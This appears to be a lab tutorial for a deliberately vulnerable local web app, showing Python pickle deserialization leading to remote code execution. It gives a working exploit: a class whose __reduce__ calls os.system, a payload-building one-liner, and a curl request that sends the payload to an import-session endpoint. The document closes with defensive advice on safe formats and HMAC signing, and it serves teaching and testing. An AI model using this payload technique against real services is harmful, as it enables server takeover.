## Insecure Deserialization (Pickle RCE)

### What is it?
Python's `pickle` module can deserialize arbitrary Python objects — including ones that execute system commands during unpickling. If an application accepts pickled data from users, an attacker can achieve **Remote Code Execution (RCE)**.

### Prerequisites
Start the vulnerable server:

```Bash
uvicorn vulnerable:app --reload
```

### Exploitation Steps

**1. Get a Legitimate Session**

First, export a normal session to see the expected format:

```Bash
curl http://127.0.0.1:8000/api/export-session
```

Expected Response (base64-encoded pickle):
```
gASVOgAAAAAAAAB9lCiMBHVzZXKUjARqb2hulIwEcm9sZZSMBnZpZXdlcpSMBXRoZW1llIwEZGFya5R1Lg==
```

**2. Craft a Malicious Pickle Payload**

Create a Python script to generate the malicious payload:

```python
# exploit.py — Run this on your machine, NOT on the server
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        # This command will be executed on the SERVER during deserialization
        return (os.system, ("echo 'HACKED! RCE achieved!' > /tmp/pwned.txt",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Malicious payload: {payload}")
```

```Bash
python3 exploit.py
```

**3. Send the Malicious Payload**

```Bash
PAYLOAD=$(python3 -c "
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('echo HACKED > /tmp/pwned.txt',))
print(base64.b64encode(pickle.dumps(E())).decode())
")

curl -X POST "http://127.0.0.1:8000/api/import-session?data=$PAYLOAD"
```

**4. Verify Code Execution**

```Bash
cat /tmp/pwned.txt
```

Expected output:
```
HACKED
```

The server executed the attacker's command during `pickle.loads()`.

**Result:** Using `pickle` to deserialize untrusted data allows full Remote Code Execution. Use JSON or other safe formats, and always validate data integrity with HMAC signatures.
